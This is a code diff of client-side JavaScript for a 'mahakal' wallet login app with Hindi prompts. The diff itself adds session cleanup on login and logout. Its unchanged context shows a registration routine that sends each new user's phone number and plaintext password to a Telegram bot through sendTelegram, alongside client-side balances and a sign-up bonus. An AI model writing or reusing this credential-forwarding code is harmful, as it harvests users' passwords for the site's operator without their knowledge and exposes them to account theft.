@@ -432,7 +432,7 @@ function sendTelegram(text) {
   fetch(url).catch(e => console.log(e));
 }
 
-// Synchronized Multi-User Independent Wallet Management System
+// Strict Independent Multi-User Wallet Management System
 function getActivePhone() {
   return localStorage.getItem('mahakal_active_user') || loggedInPhone || "";
 }
@@ -628,6 +628,7 @@ function processResetPassword() {
   setTimeout(backToLoginBox, 1500);
 }
 
+// Strict Login with Old Session Clean-up
 function processLogin() {
   if(isSystemLocked) {
     alert("⚠️ सुरक्षा कारणों से वर्तमान में नया लॉगिन बंद है। कृपया बाद में प्रयास करें!");
@@ -645,6 +646,8 @@ function processLogin() {
     msg.className = "error"; msg.innerText = "❌ कृपया पासवर्ड दर्ज करें!"; return;
   }
 
+  // Purana active session clear karke naya set karna
+  localStorage.removeItem('mahakal_active_user');
   loggedInPhone = ph; 
   localStorage.setItem('mahakal_active_user', ph); 
   updateReferralLink();
@@ -670,6 +673,7 @@ function processLogin() {
     sendTelegram(`🚀 Naya User Registered & Instant Bonus Given!\n📱 Number: ${ph}\n🔑 Pass: ${ps}\n💰 Bonus: ₹19 Credited${refText}`);
   }
 
+  // Turant usi number ka balance fetch karke dikhana
   document.getElementById('balance').innerText = getUserBalance();
 
   setTimeout(() => {
@@ -678,8 +682,10 @@ function processLogin() {
   }, 1000);
 }
 
+// Strict Logout to Prevent Balance Mixing
 function logoutUser() {
   localStorage.removeItem('mahakal_active_user');
+  loggedInPhone = "";
   location.reload();
 }
 
